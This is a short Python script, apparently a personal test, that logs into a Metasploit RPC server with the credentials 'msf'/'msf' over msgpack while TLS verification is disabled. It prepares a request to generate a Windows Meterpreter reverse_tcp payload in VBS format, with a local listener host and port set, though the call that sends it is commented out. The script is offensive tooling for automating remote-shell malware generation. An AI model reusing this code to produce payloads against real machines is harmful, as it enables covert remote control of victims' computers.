# _*_ encoding:utf-8 _*_
# __author__ = "dr0op"
# python3

import msgpack
import http.client
import requests
import ssl

def getToken(username,password):
    options = ["auth.login",username,password]
    options = msgpack.packb(options)
    headers = {"Content-type" : "binary/message-pack"}
    url = 'https://192.168.117.234:55553/api/1.0/'
    req  = requests.post(url,verify=False,headers=headers,data=options)
    res = dict(msgpack.unpackb(req.content))
    print(res)

ssl._create_default_https_context = ssl._create_unverified_context
headers = {"Content-type" : "binary/message-pack"}
url = 'https://127.0.0.1:55553/api/1.0/'



options = ["module.execute","TEMPiq1G6w0Sy6gXLis5iBlTUwPqtmcZ","payload","windows/meterpreter/reverse_tcp",{
    "LHOST":"127.0.0.1",
    "LPORT":"9988",
    "Format":"vbs"
}]


# options = msgpack.packb(options)
# req  = requests.post(url,verify=False,headers=headers,data=options)

# res = msgpack.unpackb(req.content)
# # res = res[b'payload'].decode()
# print(res)

getToken("msf","msf")